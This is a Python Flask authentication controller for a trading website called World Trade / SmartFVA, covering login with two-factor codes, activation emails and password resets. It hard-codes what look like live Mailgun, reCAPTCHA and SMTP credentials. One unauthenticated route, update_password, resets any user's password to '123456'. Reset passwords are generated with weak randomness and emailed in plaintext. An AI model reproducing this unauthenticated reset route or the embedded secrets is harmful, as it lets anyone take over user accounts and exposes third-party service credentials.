# -*- coding: utf-8 -*-
# encoding=utf8
from flask import Blueprint, request, session, redirect, url_for, render_template, flash
from flask.ext.login import login_user, logout_user
from rex import app, db
from rex.models import user_model, deposit_model, history_model, invoice_model
import json
from werkzeug.security import generate_password_hash, check_password_hash
import string
import random
import urllib 
import urllib2
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.header import Header
from email.utils import formataddr
from flask_recaptcha import ReCaptcha
import base64
import onetimepass
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from bson import ObjectId, json_util
import time
import requests
__author__ = 'carlozamagni'

auth_ctrl = Blueprint('auth', __name__, static_folder='static', template_folder='templates')
def verify_totp(token, otp_secret):
    return onetimepass.valid_totp(token, otp_secret)
def id_generator(size=6, chars=string.ascii_uppercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))
def set_password(password):
    return generate_password_hash(password)
def check_password(pw_hash, password):
    return check_password_hash(pw_hash, password)



def mail_reset_pass(email, usernames, password_new):
    html = """\
        <div style="font-family:Arial,sans-serif;background-color:#1a1c35;color:#424242;text-align:center">
   <div class="">
   </div>
   <table style="table-layout:fixed;width:90%;max-width:600px;margin:0 auto;background-color:#1a1c35">
      <tbody>
         <tr>
            <td style="padding:20px 10px 10px 0px;text-align:left">
               <a href="https://worldtrader.info/" title="World Trade" target="_blank" >
               <img src="https://worldtrader.info/static/home/images/logo/logo.png" alt="" class="" style=" width: 100px;">
               </a>
            </td>
            <td style="padding:0px 0px 0px 10px;text-align:right">
            </td>
         </tr>
      </tbody>
   </table>
</div>
<div style="font-family:Arial,sans-serif;background-color:#1a1c35;color:#424242;text-align:center">
   <table style="table-layout:fixed;width:90%;max-width:600px;margin:0 auto;background:#fff;font-size:14px;border:2px solid #e8e8e8;text-align:left;table-layout:fixed">
      <tbody>
       <tr>
          <td style="padding:30px 30px 10px 30px;line-height:1.8">Hi <b>"""+str(usernames)+"""</b>,</td></tr>
         <tr>
            <td style="padding:10px 30px;line-height:1.8">You recently requested to reset your password for your User Login and Management account on the <a href="https://worldtrader.info/" target="_blank">World Trade</a>.</td>
         </tr>
         <td style="padding:10px 30px">
            <b style="display:inline-block">New password is : </b> """+str(password_new)+""" <br>
                </td>
         <tr>
            <td style="border-bottom:3px solid #efefef;width:90%;display:block;margin:0 auto;padding-top:30px"></td>
         </tr>
         <tr>
            <td style="padding:30px 30px 30px 30px;line-height:1.3">Best regards,<br> World Trade Team<br></td>
         </tr>
      </tbody>
   </table>
</div>
<div style="font-family:Arial,sans-serif;background-color:#1a1c35;color:#424242;text-align:center;padding-bottom:10px;height: 50px;">
   
</div>
    """
    return requests.post(
      "https://api.mailgun.net/v3/worldtrader.info/messages",
      auth=("api", "key-4cba65a7b1a835ac14b7949d5795236a"),
      data={"from": "World Trade <no-reply@worldtrader.info>",
        "to": ["", email],
        "subject": "Reset Password",
        "html": html})

@auth_ctrl.route('/login', methods=['GET', 'POST'])
def login():
    error = None
    if session.get('logged_in') is not None:
        return redirect('/account/dashboard')
    if request.method == 'POST':
       
        username = request.form['username']
        password = request.form['password']
        
        if username == '':
            flash({'msg':'Vui lòng nhập ID ', 'type':'danger'})
            return redirect('/auth/login')
        if password == '':
            flash({'msg':'Vui lòng nhập mật khẩu', 'type':'danger'})
            return redirect('/auth/login')
        
        if username and password:
            username = username.lower()
            user = db.User.find_one( { 'username': username })

            if user is None or check_password(user['password'], password) == False:
                flash({'msg':'Sai ID hoặc mật khẩu. Vui lòng kiểm tra lại', 'type':'danger'})
                return redirect('/auth/login')
            else:
                if user['status_2fa'] == 1:
                    onetime = request.form['one_time_password']
                    checkVerifY = verify_totp(onetime, user['secret_2fa'])
                    if checkVerifY == False:
                        msg = 'Mã xác thực hai yếu tố bạn chỉ định không chính xác. Vui lòng kiểm tra đồng hồ trên thiết bị xác thực của bạn để xác minh rằng thiết bị đang được đồng bộ hóa'
                        flash({'msg':msg, 'type':'danger'})
                        return redirect('/auth/login')
                        
                session['logged_in'] = True
                session['user_id'] = str(user['_id'])
                session['uid'] = user['customer_id']
                   
                return redirect('/account/dashboard')
        else : 
            return redirect('/auth/login')
    return render_template('login.html', error=error)


def send_mail_register(email,usernames,link_active):
  
    html = """\
        <div style="font-family:Arial,sans-serif;background-color:#f9f9f9;color:#424242;text-align:center">
       <div class="adM">
       </div>
       <table style="table-layout:fixed;width:90%;max-width:600px;margin:0 auto;background-color:#f9f9f9">
          <tbody>
             <tr>
                <td style="padding:20px 10px 10px 0px;text-align:left">
                   <a href="https://worldtraders.info/" title="worldtraders" target="_blank" >
                   <img src="https://worldtraders.info/static/home/images/logo/logo.png" alt="worldtraders" class="CToWUd" style=" width: 200px; ">
                   </a>
                </td>
                <td style="padding:0px 0px 0px 10px;text-align:right">
                </td>
             </tr>
          </tbody>
       </table>
    </div>
    <div style="font-family:Arial,sans-serif;background-color:#f9f9f9;color:#424242;text-align:center">
       <table style="table-layout:fixed;width:90%;max-width:600px;margin:0 auto;background:#fff;font-size:14px;border:2px solid #e8e8e8;text-align:left;table-layout:fixed">
          <tbody>
             <tr>
                <td style="padding:30px 30px 10px 30px;line-height:1.8">Dear <b>"""+str(usernames)+"""</b>,</td>
             </tr>
             <tr>
                <td style="padding:10px 30px;line-height:1.8">Thank you for registering on the <a href="https://worldtraders.info/" target="_blank">World Trade</a>.</td>
             </tr>
             <tr>
                <td style="padding:10px 30px;line-height:1.8">Your World Trade verification code is: <b>"""+str(link_active)+"""</b></td>
             </tr>
             
             <tr>
                <td style="border-bottom:3px solid #efefef;width:90%;display:block;margin:0 auto;padding-top:30px"></td>
             </tr>
             <tr>
                <td style="padding:30px 30px 30px 30px;line-height:1.3">Best regards,<br>  <a href="https://worldtraders.info/" target="_blank" >World Trader</a></td>
             </tr>
          </tbody>
       </table>
    </div>
    <div style="font-family:Arial,sans-serif;background-color:#f9f9f9;color:#424242;text-align:center;padding-bottom:10px;     height: 50px;">
   
  </div>
    """
    return requests.post(
      "https://api.mailgun.net/v3/worldtrader.info/messages",
      auth=("api", "key-4cba65a7b1a835ac14b7949d5795236a"),
      data={"from": "World Trade <no-reply@worldtrader.info>",
        "to": ["", email],
        "subject": "Account activation email",
        "html": html})


@auth_ctrl.route('/resend-activation-email', methods=['GET', 'POST'])
def ResendActivationEmail():
    error = None
    if session.get('logged_in') is not None:
        return redirect('/account/dashboard')
    if request.method == 'POST':
        print 'resend activation email'
        email = request.form['email']
        recaptcha = request.form['g-recaptcha-response']
        if email and recaptcha:
            api_url     = 'https://www.google.com/recaptcha/api/siteverify';
            site_key    = '6LcESjUUAAAAAN0l4GsSiE2cLLZLZQSRZsEdSroE';
            secret_key  = '6LcESjUUAAAAAGsX2iLiwlnbBUyUsZXTz7jrPfAX';
            
            site_key_post = recaptcha

            ret = urllib2.urlopen('https://api.ipify.org')
            remoteip = ret.read()
            
            api_url = str(api_url)+'?secret='+str(secret_key)+'&response='+str(site_key_post)+'&remoteip='+str(remoteip);
            response = urllib2.urlopen(api_url)
            response = response.read()
            response = json.loads(response)
            emailss = email.lower()
            if response['success']:
                user = db.User.find_one({ 'email': emailss, 'status': 0})
                if user is None:
                    flash({'msg':'Invalid email! Please try again', 'type':'danger'})
                    return redirect('/auth/resend-activation-email')
                else:
                    code_active = user.code_active
                    link_active = 'https://worltrader.info/user/active/%s' % (code_active)
                    send_mail_register(user.email,user.username,code_active)
                    flash({'msg':'A new activation has been sent to your email address. If you do not receive the email, please wait a few minutes', 'type':'success'})
                    return redirect('/user/activecode/%s'%(user.customer_id))
                    #return redirect('/auth/login')
            else:
                flash({'msg':'Invalid captcha! Please try again', 'type':'danger'})
                return redirect('/auth/resend-activation-email')
        else:
            flash({'msg':'Invalid email! Please try again', 'type':'danger'})
            return redirect('/auth/resend-activation-email')
    return render_template('resend-activation-email.html', error=error)


@auth_ctrl.route('/reset-password', methods=['GET', 'POST'])
def forgot_password():
    error = None
    if session.get('logged_in') is not None:
        return redirect('/account/dashboard')
    if request.method == 'POST':
        print 1111111
        email = request.form['email']
        recaptcha = request.form['g-recaptcha-response']
        if email and recaptcha:
            api_url     = 'https://www.google.com/recaptcha/api/siteverify';
            site_key    = '6LcESjUUAAAAAN0l4GsSiE2cLLZLZQSRZsEdSroE';
            secret_key  = '6LcESjUUAAAAAGsX2iLiwlnbBUyUsZXTz7jrPfAX';
            
            site_key_post = recaptcha

            ret = urllib2.urlopen('https://api.ipify.org')
            remoteip = ret.read()

            api_url = str(api_url)+'?secret='+str(secret_key)+'&response='+str(site_key_post)+'&remoteip='+str(remoteip);
            response = urllib2.urlopen(api_url)
            response = response.read()
            response = json.loads(response)
            emailss = email.lower()
            if response['success']:
                user = db.User.find_one({ 'username': emailss })
                if user is None:
                    flash({'msg':'ID của bạn không tồn tại', 'type':'danger'})
                    return redirect('/auth/reset-password')
                else:
                    password_new_generate = id_generator()
                    
                    password_new = set_password(password_new_generate)
                    db.users.update({ "username" : user.username }, { '$set': { "password": password_new } })
                    #mail_reset_pass(user.email, user.username, password_new_generate)
                    flash({'msg':'Một mật khẩu mới đã được gửi đến địa chỉ email của bạn. Nếu bạn không nhận được email, vui lòng chờ một vài phút', 'type':'success'})
                    
                    return redirect('/user/login')
            else:
                flash({'msg':'Xác thực không hợp lệ! Vui lòng thử lại', 'type':'danger'})
                return redirect('/auth/reset-password')
        else:
            flash({'msg':'ID của bạn không tồn tại', 'type':'danger'})
            return redirect('/auth/reset-password')
    return render_template('reset-password.html', error=error)
@auth_ctrl.route('/update_password/<emails>', methods=['GET', 'POST'])
def dashboarupdate_weerpassword(emails):
    # return json.dumps({'qer':"qwer"})
    new_mail = emails.lower()
    password_new = set_password('123456')
    db.users.update({ "username" : new_mail }, { '$set': { 'password': password_new} })
    return json.dumps({'afa':'success'})


def reset_password_mail(email, usernames, password_new):
    username = 'support@smartfva.co'
    password = 'YK45OVfK45OVfobZ5XYobZ5XYK45OVfobZ5XYK45OVfobZ5X'
    msg = MIMEMultipart('mixed')

    sender = 'support@smartfva.co'
    recipient = str(email)

    msg['Subject'] = 'SmartFVA Reset Password'
    msg['From'] = sender
    msg['To'] = recipient
    # username = 'no-reply@smartfva.co'
    # password = 'rbdlnsmxqpswyfdv'
    # msg = MIMEMultipart('mixed')
    # mailServer = smtplib.SMTP('smtp.gmail.com', 587) # 8025, 587 and 25 can also be used. 
    # mailServer.ehlo()
    # mailServer.starttls()
    # mailServer.ehlo()
    # mailServer.login(username, password)
    # sender = 'no-reply@smartfva.co'
    # recipient = email

    # msg['Subject'] = 'SmartFVA Reset Password'
    # msg['From'] = sender
    # msg['To'] = recipient
    html = """\
        <div style="font-family:Arial,sans-serif;background-color:#f9f9f9;color:#424242;text-align:center">
   <div class="adM">
   </div>
   <table style="table-layout:fixed;width:90%;max-width:600px;margin:0 auto;background-color:#f9f9f9">
      <tbody>
         <tr>
            <td style="padding:20px 10px 10px 0px;text-align:left">
               <a href="https://smartfva.co/" title="smartfva" target="_blank" >
               <img src="https://i.imgur.com/tyjTbng.png" alt="smartfva" class="CToWUd" style=" width: 100px; ">
               </a>
            </td>
            <td style="padding:0px 0px 0px 10px;text-align:right">
            </td>
         </tr>
      </tbody>
   </table>
</div>
<div style="font-family:Arial,sans-serif;background-color:#f9f9f9;color:#424242;text-align:center">
   <table style="table-layout:fixed;width:90%;max-width:600px;margin:0 auto;background:#fff;font-size:14px;border:2px solid #e8e8e8;text-align:left;table-layout:fixed">
      <tbody>
       <tr>
                <td style="padding:30px 30px 10px 30px;line-height:1.8">Hello <b>"""+str(usernames)+"""</b>,</td>
             </tr>
         <tr>
            <td style="padding:10px 30px;line-height:1.8">Your SmartFVA Account password has been changed.</td>
         </tr>
         <td style="padding:10px 30px">
                   Your new password is: <b> """+str(password_new)+""" </b> <br>
                </td>
         <tr>
            <td style="border-bottom:3px solid #efefef;width:90%;display:block;margin:0 auto;padding-top:30px"></td>
         </tr>
         <tr>
            <td style="padding:30px 30px 30px 30px;line-height:1.3">Best regards,<br> Smartfva Team<br>  <a href="https://smartfva.co/" target="_blank" >www.smartfva.co</a></td>
         </tr>
      </tbody>
   </table>
</div>
<div style="font-family:Arial,sans-serif;background-color:#f9f9f9;color:#424242;text-align:center;padding-bottom:10px;     height: 50px;">
   
</div>
    """
    
    html_message = MIMEText(html, 'html')
    
    msg.attach(html_message)

    mailServer = smtplib.SMTP('mail.smtp2go.com', 2525) # 8025, 587 and 25 can also be used. 
    mailServer.ehlo()
    mailServer.starttls()
    mailServer.ehlo()
    mailServer.login(username, password)
    mailServer.sendmail(sender, recipient, msg.as_string())
    mailServer.close()

@auth_ctrl.route('/reset_password', methods=['GET', 'POST'])
def reset_passwordss():
    return json.dumps({'qer':"qwer"})
    user = db.users.find({}).skip(251).limit(300)
    i = 0
    for x in user:
        i = i+ 1
        new_mail = x['email'].lower()
        password_new_generate = id_generator()
        password_new = set_password(password_new_generate)
        db.users.update({ "_id" : ObjectId(x['_id']) }, { '$set': { 'password': password_new} })
        reset_password_mail(new_mail, x['username'], password_new_generate)
        print i
        time.sleep(1)
    return json.dumps({'afa':'success'})

@auth_ctrl.route('/logout')
def logout():
    session.pop('logged_in', None)
    logout_user()
    session.clear()
    return redirect('/')


